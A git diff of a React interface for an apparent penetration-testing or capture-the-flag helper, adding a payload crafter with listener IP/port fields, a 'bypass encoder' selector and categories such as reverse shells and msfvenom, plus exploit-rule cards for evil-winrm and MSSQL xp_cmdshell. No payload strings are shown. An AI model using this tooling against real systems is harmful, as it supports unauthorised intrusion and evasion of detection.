                   <div className="flex items-center justify-between border-b border-cyber-border/80 pb-2.5 flex-wrap gap-2">
                     <div className="flex items-center gap-2">
@@ -476,14 +607,25 @@ export const ReconAutomationModal: React.FC = () => {
                       )}
                     </div>
 
-                    {/* 1-Click Automation Button */}
-                    <motion.button
-                      whileHover={{ scale: 1.03 }}
-                      whileTap={{ scale: 0.97 }}
+                    {/* Apply to Target Button with Frozen Solve Guard */}
+                    <button
+                      disabled={isTargetFrozen || parsedResults.ports.length === 0}
                       onClick={handleApplyToMachine}
-                      className="px-3 py-1.5 rounded-lg bg-cyber-emerald text-black font-bold text-xs flex items-center gap-1.5 shadow-glow-emerald transition-all"
+                      title={isTargetFrozen ? "Target is marked completed. Select an in-progress target." : undefined}
+                      className={`px-3 py-1.5 rounded-lg font-bold text-xs flex items-center gap-1.5 transition-all shadow-sm ${
+                        isTargetFrozen
+                          ? 'bg-gray-800 text-gray-500 border border-gray-700 cursor-not-allowed opacity-60'
+                          : appliedSuccess
+                          ? 'bg-cyber-emerald text-black shadow-glow-emerald'
+                          : 'bg-cyber-cyan text-black hover:bg-cyan-300 shadow-glow-cyan'
+                      }`}
                     >
-                      {appliedSuccess ? (
+                      {isTargetFrozen ? (
+                        <>
+                          <Lock className="w-3.5 h-3.5 text-gray-400" />
+                          <span>FROZEN // SOLVE COMPLETED</span>
+                        </>
+                      ) : appliedSuccess ? (
                         <>
                           <Check className="w-3.5 h-3.5" />
                           <span>AUTO-APPLIED TO TARGET!</span>
@@ -494,7 +636,7 @@ export const ReconAutomationModal: React.FC = () => {
                           <span>APPLY TO {targetMachine?.name.toUpperCase()}</span>
                         </>
                       )}
-                    </motion.button>
+                    </button>
                   </div>
 
                   {/* Ports Grid / Table */}
@@ -505,8 +647,8 @@ export const ReconAutomationModal: React.FC = () => {
                         className="p-2.5 rounded-lg bg-cyber-card border border-cyber-border/70 flex items-start justify-between gap-3 hover:border-cyber-cyan/40 transition-colors"
                       >
                         <div className="space-y-1">
-                          <div className="flex items-center gap-2">
-                            <span className="font-bold text-cyber-emerald text-sm">
+                          <div className="flex items-center gap-2 flex-wrap">
+                            <span className="font-bold text-cyber-cyan text-sm font-mono">
                               {p.port}/{p.protocol}
                             </span>
                             <span className="px-1.5 py-0.2 rounded bg-cyber-bg border border-cyber-border font-bold text-[10px] text-white uppercase">
@@ -519,7 +661,7 @@ export const ReconAutomationModal: React.FC = () => {
 
                           {p.cveNotes && (
                             <div className="text-[11px] text-cyber-crimson font-semibold flex items-center gap-1.5">
-                              <ShieldAlert className="w-3.5 h-3.5" />
+                              <ShieldAlert className="w-3.5 h-3.5 flex-shrink-0" />
                               <span>{p.cveNotes}</span>
                             </div>
                           )}
@@ -544,80 +686,212 @@ export const ReconAutomationModal: React.FC = () => {
             </div>
           )}
 
+          {/* TAB 2: TACTICAL PAYLOAD CRAFTER */}
           {activeTab === 'payloads' && (
-            <div className="space-y-3.5">
-              <div className="p-3 rounded-xl bg-cyber-bg border border-cyber-border flex items-center justify-between flex-wrap gap-2 text-xs">
-                <div>
-                  <span className="text-cyber-muted text-[10px] uppercase font-bold">TUNED LISTENER: </span>
-                  <span className="text-cyber-emerald font-bold">{lhost}:{lport}</span>
-                  <span className="text-cyber-muted text-[10px] uppercase font-bold ml-4">TARGET IP: </span>
-                  <span className="text-cyber-cyan font-bold">{payloadTargetIp}</span>
+            <div className="space-y-4">
+              {/* Listener & Target HUD Bar */}
+              <div className="p-3 rounded-xl bg-cyber-bg border border-cyber-border flex items-center justify-between flex-wrap gap-3 text-xs">
+                <div className="flex items-center gap-4 flex-wrap">
+                  <div className="flex items-center gap-2">
+                    <span className="text-cyber-muted text-[10px] uppercase font-bold">LHOST (TUN0):</span>
+                    <input
+                      type="text"
+                      value={globalVars.lhost}
+                      onChange={(e) => setGlobalVars({ lhost: e.target.value })}
+                      placeholder="10.10.14.X"
+                      className="w-28 px-2 py-1 rounded bg-cyber-card border border-cyber-border text-cyber-emerald font-mono font-bold text-xs focus:outline-none focus:border-cyber-emerald"
+                    />
+                  </div>
+
+                  <div className="flex items-center gap-2">
+                    <span className="text-cyber-muted text-[10px] uppercase font-bold">LPORT:</span>
+                    <input
+                      type="text"
+                      value={globalVars.lport}
+                      onChange={(e) => setGlobalVars({ lport: e.target.value })}
+                      placeholder="4444"
+                      className="w-16 px-2 py-1 rounded bg-cyber-card border border-cyber-border text-cyber-emerald font-mono font-bold text-xs focus:outline-none focus:border-cyber-emerald"
+                    />
+                  </div>
+
+                  <div className="flex items-center gap-2">
+                    <span className="text-cyber-muted text-[10px] uppercase font-bold">TARGET IP:</span>
+                    <span className="px-2 py-1 rounded bg-cyber-card border border-cyber-border text-cyber-cyan font-mono font-bold text-xs">
+                      {payloadTargetIp}
+                    </span>
+                  </div>
                 </div>
+
                 <span className="text-[10px] text-cyber-muted">
-                  Auto-formatted with your tun0 IP & Port
+                  Parameters automatically interpolated in real time
                 </span>
               </div>
 
+              {/* Bypass Encoder Matrix Pills */}
+              <div className="p-3 rounded-xl bg-cyber-card border border-cyber-border space-y-2">
+                <div className="flex items-center justify-between">
+                  <span className="text-[10px] font-bold text-cyber-muted uppercase flex items-center gap-1.5">
+                    <Sliders className="w-3.5 h-3.5 text-cyber-cyan" />
+                    REAL-TIME BYPASS ENCODER MATRIX:
+                  </span>
+                  <span className="text-[10px] text-cyber-cyan font-semibold">
+                    Active: {ENCODER_OPTIONS.find(e => e.id === selectedEncoder)?.label}
+                  </span>
+                </div>
+
+                <div className="flex items-center gap-1.5 flex-wrap">
+                  {ENCODER_OPTIONS.map((enc) => {
+                    const isSelected = selectedEncoder === enc.id;
+                    return (
+                      <button
+                        key={enc.id}
+                        onClick={() => {
+                          setSelectedEncoder(enc.id);
+                          if (soundEnabled) playCyberSound('click');
+                        }}
+                        title={enc.description}
+                        className={`px-2.5 py-1 rounded text-xs font-mono font-bold transition-all flex items-center gap-1.5 ${
+                          isSelected
+                            ? 'bg-cyber-emerald text-black shadow-glow-emerald/30 border border-cyber-emerald'
+                            : 'bg-cyber-bg border border-cyber-border text-cyber-muted hover:text-white hover:border-cyber-borderGlow'
+                        }`}
+                      >
+                        <span>{enc.badge}</span>
+                        <span className="text-[10px] opacity-80 hidden sm:inline">({enc.label})</span>
+                      </button>
+                    );
+                  })}
+                </div>
+              </div>
+
+              {/* Category Filter & Search Bar */}
+              <div className="flex items-center justify-between gap-3 flex-wrap text-xs">
+                <div className="flex items-center gap-1.5 flex-wrap">
+                  {(['all', 'revshell', 'web', 'msfvenom', 'ad', 'privesc'] as const).map((cat) => (
+                    <button
+                      key={cat}
+                      onClick={() => setPayloadCategory(cat)}
+                      className={`px-3 py-1 rounded text-xs font-bold transition-all ${
+                        payloadCategory === cat
+                          ? 'bg-cyber-cyan/15 border border-cyber-cyan text-cyber-cyan shadow-sm'
+                          : 'bg-cyber-bg border border-cyber-border text-cyber-muted hover:text-white'
+                      }`}
+                    >
+                      {cat === 'all' && 'ALL PAYLOADS'}
+                      {cat === 'revshell' && 'REVERSE SHELLS'}
+                      {cat === 'web' && 'WEB INJECTION'}
+                      {cat === 'msfvenom' && 'MSFVENOM'}
+                      {cat === 'ad' && 'ACTIVE DIRECTORY'}
+                      {cat === 'privesc' && 'PRIVESC'}
+                    </button>
+                  ))}
+                </div>
+
+                <div className="relative">
+                  <Search className="w-3.5 h-3.5 absolute left-2.5 top-1/2 -translate-y-1/2 text-cyber-muted" />
+                  <input
+                    type="text"
+                    value={payloadSearch}
+                    onChange={(e) => setPayloadSearch(e.target.value)}
+                    placeholder="Search payloads..."
+                    className="pl-8 pr-3 py-1 rounded bg-cyber-bg border border-cyber-border text-white text-xs w-44 sm:w-56 focus:outline-none focus:border-cyber-cyan"
+                  />
+                </div>
+              </div>
+
+              {/* Payload Cards List */}
               <div className="space-y-3">
-                {automatedPayloads.map((item) => (
-                  <div
-                    key={item.id}
-                    className="p-3.5 rounded-xl border border-cyber-border bg-cyber-card space-y-2.5 shadow-sm"
-                  >
-                    <div className="flex items-center justify-between">
-                      <div className="flex items-center gap-2">
-                        <span className="font-bold text-white text-xs">{item.title}</span>
-                        <span className="text-[9px] px-1.5 py-0.2 rounded bg-cyber-bg border border-cyber-border text-cyber-muted">
-                          {item.category}
-                        </span>
+                {filteredPayloads.map((item) => {
+                  const rawCmd = item.commandTemplate;
+                  const encodedCmd = applyBypassEncoder(rawCmd, selectedEncoder);
+                  const isRawMode = selectedEncoder === 'raw';
+
+                  return (
+                    <div
+                      key={item.id}
+                      className="p-3.5 rounded-xl border border-cyber-border bg-cyber-card space-y-2.5 shadow-sm hover:border-cyber-borderGlow transition-colors"
+                    >
+                      <div className="flex items-center justify-between gap-2 flex-wrap">
+                        <div className="flex items-center gap-2 flex-wrap">
+                          <span className="font-bold text-white text-xs">{item.title}</span>
+                          <span className="text-[9px] px-2 py-0.5 rounded bg-cyber-bg border border-cyber-border text-cyber-cyan font-bold">
+                            {item.subCategory}
+                          </span>
+                          <span className={`text-[9px] px-1.5 py-0.2 rounded font-bold ${
+                            item.os === 'Windows'
+                              ? 'text-blue-400 bg-blue-950/40 border border-blue-800/40'
+                              : item.os === 'Linux'
+                              ? 'text-cyber-emerald bg-emerald-950/40 border border-emerald-800/40'
+                              : 'text-purple-400 bg-purple-950/40 border border-purple-800/40'
+                          }`}>
+                            {item.os}
+                          </span>
+                        </div>
+
+                        <div className="flex items-center gap-2">
+                          <button
+                            onClick={() => copyPayload(rawCmd, item.id + '-raw')}
+                            className="px-2.5 py-1 rounded bg-cyber-bg border border-cyber-border text-cyber-muted hover:text-white hover:border-cyber-cyan text-[11px] flex items-center gap-1 transition-colors"
+                          >
+                            {copiedPayloadKey === item.id + '-raw' ? (
+                              <>
+                                <Check className="w-3 h-3 text-cyber-emerald" />
+                                <span className="text-cyber-emerald font-bold">COPIED RAW</span>
+                              </>
+                            ) : (
+                              <>
+                                <Copy className="w-3 h-3" />
+                                <span>COPY RAW</span>
+                              </>
+                            )}
+                          </button>
+
+                          <button
+                            onClick={() => copyPayload(encodedCmd, item.id + '-enc')}
+                            className={`px-3 py-1 rounded text-[11px] flex items-center gap-1.5 transition-all font-bold ${
+                              copiedPayloadKey === item.id + '-enc'
+                                ? 'bg-cyber-emerald text-black shadow-glow-emerald'
+                                : 'bg-cyber-cyan/15 border border-cyber-cyan text-cyber-cyan hover:bg-cyber-cyan hover:text-black shadow-sm'
+                            }`}
+                          >
+                            {copiedPayloadKey === item.id + '-enc' ? (
+                              <>
+                                <Check className="w-3 h-3" />
+                                <span>COPIED!</span>
+                              </>
+                            ) : (
+                              <>
+                                <Zap className="w-3 h-3" />
+                                <span>
+                                  {isRawMode ? 'COPY' : `COPY [${selectedEncoder.toUpperCase()}]`}
+                                </span>
+                              </>
+                            )}
+                          </button>
+                        </div>
                       </div>
 
-                      <div className="flex items-center gap-2">
-                        <button
-                          onClick={() => copyPayload(item.payload, item.id + '-raw')}
-                          className="px-2.5 py-1 rounded bg-cyber-bg border border-cyber-border text-cyber-cyan hover:border-cyber-cyan text-[11px] flex items-center gap-1 transition-colors"
-                        >
-                          {copiedPayloadId === item.id + '-raw' ? (
-                            <>
-                              <Check className="w-3 h-3 text-cyber-emerald" />
-                              <span className="text-cyber-emerald font-bold">COPIED RAW</span>
-                            </>
-                          ) : (
-                            <>
-                              <Copy className="w-3 h-3" />
-                              <span>COPY RAW</span>
-                            </>
-                          )}
-                        </button>
+                      <p className="text-[11px] text-cyber-muted leading-relaxed">
+                        {item.description}
+                      </p>
 
-                        <button
-                          onClick={() => copyPayload(item.encodedPayload, item.id + '-enc')}
-                          className="px-2.5 py-1 rounded bg-cyber-bg border border-cyber-border text-cyber-emerald hover:border-cyber-emerald text-[11px] flex items-center gap-1 transition-colors font-semibold"
-                        >
-                          {copiedPayloadId === item.id + '-enc' ? (
-                            <>
-                              <Check className="w-3 h-3 text-cyber-emerald" />
-                              <span>COPIED ENCODED</span>
-                            </>
-                          ) : (
-                            <>
-                              <Zap className="w-3 h-3" />
-                              <span>BASE64 WRAP</span>
-                            </>
-                          )}
-                        </button>
+                      <div className="p-2.5 rounded-lg bg-cyber-bg border border-cyber-border/70 text-cyber-emerald font-mono text-[11px] overflow-x-auto whitespace-pre-wrap break-all shadow-inner">
+                        {encodedCmd}
                       </div>
                     </div>
+                  );
+                })}
 
-                    <div className="p-2 rounded-lg bg-cyber-bg border border-cyber-border/70 text-cyber-emerald font-mono text-[11px] overflow-x-auto whitespace-pre-wrap break-all">
-                      {item.payload}
-                    </div>
+                {filteredPayloads.length === 0 && (
+                  <div className="p-8 text-center text-cyber-muted rounded-xl bg-cyber-bg border border-cyber-border">
+                    No tactical payloads match your query "{payloadSearch}".
                   </div>
-                ))}
+                )}
               </div>
             </div>
           )}
 
+          {/* TAB 3: EXPLOIT RULE ADVISOR */}
           {activeTab === 'rules' && (
             <div className="space-y-3">
               <div className="p-3 rounded-xl bg-cyber-bg border border-cyber-border text-xs space-y-1">
@@ -626,7 +900,7 @@ export const ReconAutomationModal: React.FC = () => {
                   <span>AUTOMATED EXPLOIT HEURISTICS & RULES</span>
                 </div>
                 <p className="text-cyber-muted text-[11px]">
-                  These automatic heuristics match detected services directly to high-probability exploitation avenues.
+                  These automatic heuristics map discovered ports and daemons directly to tactical exploitation avenues.
                 </p>
               </div>
 
@@ -668,6 +942,26 @@ export const ReconAutomationModal: React.FC = () => {
                   </div>
                   <p className="text-[11px] text-cyber-muted">
                     Automates kerbrute user enumeration and Impacket GetNPUsers hash dumping.
+                  </p>
+                </div>
+
+                <div className="p-3 rounded-xl bg-cyber-card border border-cyber-border space-y-1.5">
+                  <div className="flex items-center justify-between">
+                    <span className="font-bold text-white text-xs">WinRM Remote Shell</span>
+                    <span className="text-[10px] text-cyber-emerald font-mono">PORT 5985/5986</span>
+                  </div>
+                  <p className="text-[11px] text-cyber-muted">
+                    Instant evil-winrm interactive PowerShell session using captured credentials or hashes.
+                  </p>
+                </div>
+
+                <div className="p-3 rounded-xl bg-cyber-card border border-cyber-border space-y-1.5">
+                  <div className="flex items-center justify-between">
+                    <span className="font-bold text-white text-xs">MSSQL xp_cmdshell</span>
+                    <span className="text-[10px] text-cyber-emerald font-mono">PORT 1433</span>
+                  </div>
+                  <p className="text-[11px] text-cyber-muted">
+                    Tests mssqlclient.py connection, linked database servers, and xp_cmdshell command execution.
                   </p>
                 </div>
               </div>
